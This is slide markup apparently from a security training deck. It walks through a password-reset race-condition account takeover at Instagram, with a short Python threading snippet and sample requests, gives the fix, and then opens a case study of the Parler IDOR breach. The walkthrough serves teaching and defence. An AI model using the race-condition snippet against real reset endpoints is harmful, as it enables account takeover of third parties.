              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="750" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Light" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Light" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Light" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>01</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7444145" y="2029778"/>
            <a:ext cx="6581894" cy="15240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="007EBD"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7444145" y="2109907"/>
            <a:ext cx="1438870" cy="163116"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1250"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Initiate Reset for Victim</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7444145" y="2328982"/>
            <a:ext cx="6581894" cy="626269"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6669"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7439263" y="2328982"/>
            <a:ext cx="6591657" cy="626269"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2382"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7538680" y="2403515"/>
            <a:ext cx="6392823" cy="477202"/>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POST /api/request-reset</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{"email": "victim@example.com"}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="900"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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Victim receives code: 123456</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7444145" y="3079552"/>
            <a:ext cx="99417" cy="124301"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="900"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="750" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Light" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Light" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Light" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>02</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Shape 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7444145" y="3233261"/>
            <a:ext cx="6581894" cy="15240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="007EBD"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7444145" y="3313390"/>
            <a:ext cx="1305163" cy="163116"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1250"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Obtain Reset Code</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7444145" y="3526274"/>
            <a:ext cx="6581894" cy="119301"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="non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Attacker obtains victim's reset code through social engineering, phishing, or SIM swapping</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Text 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7444145" y="3769876"/>
            <a:ext cx="99417" cy="124301"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="900"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="750" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Light" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Light" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Light" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>03</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Shape 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7444145" y="3923586"/>
            <a:ext cx="6581894" cy="15240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="007EBD"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Text 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7444145" y="4003715"/>
            <a:ext cx="1381720" cy="163116"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1250"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Exploit Race Condition</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Shape 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7444145" y="4222790"/>
            <a:ext cx="6581894" cy="984171"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4244"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Shape 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7439263" y="4222790"/>
            <a:ext cx="6591657" cy="984171"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1516"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Text 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7538680" y="4297323"/>
            <a:ext cx="6392823" cy="835104"/>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Send 100+ simultaneous requests</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for i in range(100):</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Thread(target=reset_password, </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args=("123456", "hacked123")).start()</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="900"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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Multiple requests pass the "not used"</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check before code is marked consumed</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Text 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7444145" y="5331262"/>
            <a:ext cx="99417" cy="124301"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="900"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="750" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Light" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Light" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Light" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>04</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Shape 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7444145" y="5484971"/>
            <a:ext cx="6581894" cy="15240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="007EBD"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Text 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7444145" y="5565100"/>
            <a:ext cx="1305163" cy="163116"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1250"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Account Takeover</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Shape 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7444145" y="5784175"/>
            <a:ext cx="6581894" cy="864870"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4829"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Shape 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7439263" y="5784175"/>
            <a:ext cx="6591657" cy="864870"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1725"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="Text 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7538680" y="5858708"/>
            <a:ext cx="6392823" cy="715804"/>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POST /api/login</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"username": "victim@example.com",</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"password": "hacked123"</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a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="900"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="750" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t># SUCCESS - Complete account access</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="37" name="Text 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="611981" y="6854190"/>
            <a:ext cx="2168366" cy="195858"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1500"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Technical Exploitation Details</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="Text 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="611981" y="7124700"/>
            <a:ext cx="13406437" cy="357902"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="900"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="750" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>The researcher developed a Python script using threading to send simultaneous password reset requests. By exploiting the race condition window (typically 50-200ms), multiple requests could simultaneously read the "unused" status before any marked it as used. This bypassed the single-use protection entirely. The attack worked reliably with 50-100 concurrent requests, and success rate increased with the number of simultaneous attempts. Instagram patched this by implementing database-level locks and atomic compare-and-swap operations for reset code validation.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="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7226" y="722828"/>
            <a:ext cx="5506283" cy="406598"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="3200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2550" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Parler - Complete Data Breach (2021)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2550" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Shape 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="667226" y="1272421"/>
            <a:ext cx="953929" cy="196929"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 21143"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CCEEFF"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="741521" y="1309568"/>
            <a:ext cx="805339" cy="122634"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="950"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="750" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>CASE STUDY 8.4</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1683068" y="1264801"/>
            <a:ext cx="1114187" cy="212169"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 19624"/>
            </a:avLst>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="007EBD"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1764983" y="1309568"/>
            <a:ext cx="950357" cy="122634"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="950"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="750" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="007EBD"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>CRITICAL SEVERITY</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="667226" y="1553051"/>
            <a:ext cx="13295948" cy="306467"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>In January 2021, Parler suffered one of the most catastrophic data breaches in social media history. Due to completely unsecured API endpoints with sequential IDOR vulnerabilities and missing authorization controls, attackers scraped 70 terabytes of data—representing 99.9% of the platform's entire dataset.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="667226" y="1997512"/>
            <a:ext cx="4375547" cy="408861"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="3200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>70TB</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2041803" y="2519005"/>
            <a:ext cx="1626394" cy="203240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="1600"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
